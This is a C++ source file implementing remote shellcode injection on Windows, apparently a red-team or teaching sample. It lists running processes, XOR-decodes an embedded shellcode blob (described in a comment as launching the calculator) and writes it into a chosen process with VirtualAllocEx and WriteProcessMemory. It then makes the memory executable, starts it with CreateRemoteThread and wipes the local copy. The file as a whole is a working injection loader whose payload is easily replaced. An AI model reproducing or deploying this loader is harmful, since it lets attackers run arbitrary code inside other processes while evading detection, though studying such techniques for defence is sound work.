// Shellcode_Injection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <TlHelp32.h>
#include <string.h>


PROCESSENTRY32 Process = {
    Process.dwSize = sizeof(PROCESSENTRY32)
};

DWORD dwOldProtection;

void Inject_Shellcode(IN int pid) {
	
    printf("\n[*] Loaded Encrypted Shellcode ");

    // Paylod is a simple calculator launching shellcode
	unsigned char payload[] = "\x40\x39\xc8\x40\x39\xc1\x6d\x40\x83\x40\x68\x40\x83\x41\x10\x40\x83\x41\x28\x40\x83\x1\x40\x83\x1\x40\x83\x41\x28\x41\x81\xc2\x83\x41\x34\x44\x9\xd9\x83\x81\x80\x8\x8\x8\x44\x9\xd9\x45\x39\xc1\x4c\x83\x41\x14\x45\x9\xd9\x45\x39\xd3\x4c\x83\x51\x28\x45\x9\xdb\x45\x39\xec\x4c\x83\x69\x2c\x45\x9\xdc\x40\x39\xc1\xb1\xf\x8\x8\x8\x40\xb0\x5f\x61\x66\x4d\x70\x6d\x6b\x8\x58\x59\xe0\xd\x8\x8\x8\x41\x81\xce\xe3\x3a\x53\x51\x40\x39\xc8\x40\x81\xea\x59\x40\x83\x4\x2c\x40\x39\xf7\x49\x83\x34\x8b\x44\x9\xdf\x40\x81\xde\xfb\xae\x7c\xd\x40\xf7\xc8\xe3\xee\x51\x6e\x49\x83\xc\x4c\x49\x83\xc\x89\x44\x9\xd8\x5b\xcb\x40\x39\xc1\x40\xff\xe9\x58\x40\xb0\x6b\x69\x64\x6b\x26\x6d\x70\x6d\x58\x40\x81\xe9\x40\xf7\xca\x40\x8b\xe4\x28\x49\xf7\xde";

    printf("\n[*] Decrypting the Shellcode");

    for (int i = 0; i < sizeof(payload); i++) {
        payload[i] = payload[i] ^ 8;
    }

    printf("\n[*] Decrypted the shellcode ");

    //Open Process is to get the handle of the given pid
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    printf("\n[*] Allocating memory in Target Process");

    //VirtualAllocEx is used to allocate space into the memory space of the target process
	LPVOID Inject_Payload_Addr = VirtualAllocEx(hProcess,NULL,sizeof(payload),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (Inject_Payload_Addr == NULL) {
		printf("[*] VirtualAllocEx Failed with error : %d", GetLastError());
		exit(1);
	}

    printf("\n[*] Writing memory into allocated Virtual Space");

    //WriteProcessMemory is used to write into the Allocated memory from the 
	BOOL Writemem = WriteProcessMemory(hProcess, Inject_Payload_Addr, payload, sizeof(payload), NULL);
	if (!Writemem) {
		printf("[*] WriteProcessMemory Failed with error : %d", GetLastError());
		exit(1);
	}


	memset(payload, '\0', sizeof(payload));
	printf("\n[*] Cleared shellcode from memory");


    printf("\n[*] Changing Memory Access");

	BOOL Virtual_Protect_Status = VirtualProtectEx(hProcess, Inject_Payload_Addr, sizeof(payload), PAGE_EXECUTE_READWRITE, &dwOldProtection);
	if (!Virtual_Protect_Status) {
		printf("[*] VirtualProtectEx Failed with error : %d", GetLastError());
		exit(1);
	}

    printf("\n[*] Executing Shellcode ... ");

	HANDLE Thread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)Inject_Payload_Addr, NULL, NULL, NULL);
	if (Thread == NULL) {
		printf("[*] CreateRemoteThread Failed with error : %d", GetLastError());
		exit(1);
	}

}


void Process_Enum() {
    HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    Process32FirstW(Snapshot, &Process);

    do {
        wprintf(L"\nPROCESS NAME : %-40s PID : %d", Process.szExeFile, Process.th32ProcessID);
    } while (Process32NextW(Snapshot, &Process));
}


int main() {


    BOOL x = 1;
    while (x) {

        int pid;
        char choice;
        wchar_t DLL_Name[MAX_PATH];

        printf("\n\n[*][*][*] Remote Shellcode Injection [*][*][*]\n");
        printf("To print all process Names and PID       : [A] \n");
        printf("To inject into a process with it's PID   : [P] \n");
        printf("To Exit                                  : [X] \n");
        printf("Enter choice A/P/X: ");
        std::cin >> choice;

        if (choice == 'A')
            Process_Enum();

        else if (choice == 'P') {
            printf("\nEnter the PID : ");
            scanf_s("%d", &pid);
            Inject_Shellcode(pid);
        }

        else if (choice == 'X')
            x = 0;
    }
    return 0;
}

